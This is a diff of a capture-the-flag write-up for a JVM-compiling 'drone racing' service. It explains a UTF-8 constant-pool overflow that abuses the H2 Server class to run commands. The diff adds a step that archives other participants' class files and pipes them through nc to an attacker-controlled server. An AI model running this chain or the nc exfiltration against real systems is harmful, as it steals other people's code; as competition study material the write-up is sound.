@@ -29,13 +29,13 @@ This vulnerability doesn't allow to steal flags.
 
 The second vulnerability is more interesting.
 
-Programs passed to the server are compiled into JVM bytecode. In the first pass the program is compiled into commands for the abstract stack machine. In the second pass the abstract stack machine program is compiled into to JVM code via ObjectWeb ASM library. While compiling into JVM, the name of the resulting class is a placeholder containing "ae/hitb/proctf/drone_racing/DroneRacingProgram".
+Programs passed to the server are compiled into JVM bytecode. In the first pass the program is compiled into commands for the abstract stack machine. In the second pass the abstract stack machine program is compiled into JVM code via ObjectWeb ASM library. While compiling into JVM, the name of the resulting class is a placeholder containing "ae/hitb/proctf/drone_racing/DroneRacingProgram".
 
 JVM uses a pool of constants — a special section in the .class file that contains all the constants used in the program. Constants are typed and follow each other. One of the types is UTF-8 string. The constants in the pool are unique, so despite the fact that the class name is used more than once in the bytecode, the corresponding string is stored only once, somewhere in the constant pool.
 
 Another interesting type is ClassName. ClassName constants don't hold the actual string but rather a reference (index in the constant pool) to a UTF-8 string. So, when the class name is processed, it first takes the reference and follows it to retrieve the actual string.
 
-Once the class file has been generated, the service replaces a placeholder name in the constant pool with the actual title of the program. The service checks that the title of the program does not exceed 46 characters - the length of the placeholder. If the program title is shorter, it is padded to 46 characters.
+Once the class file has been generated, the service replaces a placeholder name in the constant pool with the actual title of the program. The service checks that the title of the program does not exceed 46 characters — the length of the placeholder. If the program title is shorter, it is padded to 46 characters.
 
 BUT. The class name is checked as a string, but is then stored in the .class file as a UTF-8 encoded byte sequence. Therefore we can overflow the constant if we use non-ASCII chars. We can not use 4-byte UTF-8 characters (because .class files have a *peculiar* UTF-8 implementation), but we can use 3-byte UTF-8 characters and overflow up to 2 * 46 bytes!
 
@@ -71,6 +71,6 @@ To recap, this is the outline of the exploit:
     1. title has non-ASCII chars to overflow the class name and change the base class to "h2/tools/Server";
     2. `setMaze(String)` function is defined in the program, otherwise running the code will fail before start;
     3. there's a call to `openBrowser("programs/")` somewhere in the program;
-3. Run the drone program with params `"h2.browser": "tar,czf,static/classes.tar.gz,%url"`
+3. Run the drone program with params `"h2.browser": "tar,czf,classes.tar.gz,%url"`
 
-Once run, this program will archive all the class files uploaded by all participants and put the archive to static/classes.tar.gz, which is available via static file downloading.
+Once run, this program will archive all the class files uploaded by all participants and put the archive to classes.tar.gz. It remains only to steal this file. It can be made i.e. via running `"sh,-c,"base64 classes.tar.gz | nc <your_server> <port>"` the same way. Also you need to get and decode file on the remote side (i.e. via `nc -l -p <port> | base64 -d > classes.tar.gz`)
